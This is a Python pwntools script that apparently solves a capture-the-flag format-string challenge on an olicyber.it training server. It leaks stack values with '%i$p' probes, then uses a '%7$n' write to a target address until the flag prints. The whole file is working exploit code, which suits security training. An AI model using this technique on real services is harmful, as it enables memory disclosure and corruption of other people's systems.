from pwn import *
import re

context.log_level = 'error'


# ------ TEST 2 ------
response = ""
i = 1
ris = []

while "0x40121a" not in response and i < 10:
    r = remote("formatted.challs.olicyber.it",  10305)

    r.recv(512)
    packet = f" %{i}$p"
    r.sendline(packet.encode())

    response = "".join(r.recvuntil(b"!!\n").decode())
    r.close()
    
    print(re.findall(r"0x[0-9a-fA-F]+", response), end = "")
    print(f"     =>      %{i}$p")
    i+=1

# ------ TEST 3 ------
addr = p64(0x40404c)  # address di flag
payload = " %7$n"
data = ""

while "flag" not in data:
    r = remote("formatted.challs.olicyber.it",  10305)
    r.recv(512)

    payload += " "
    r.sendline(payload.encode() + addr)

    data = r.recvall(timeout=2).decode()

    r.close()

print("\n\n")
print("".join(re.findall(r"flag\{.*?\}", data)))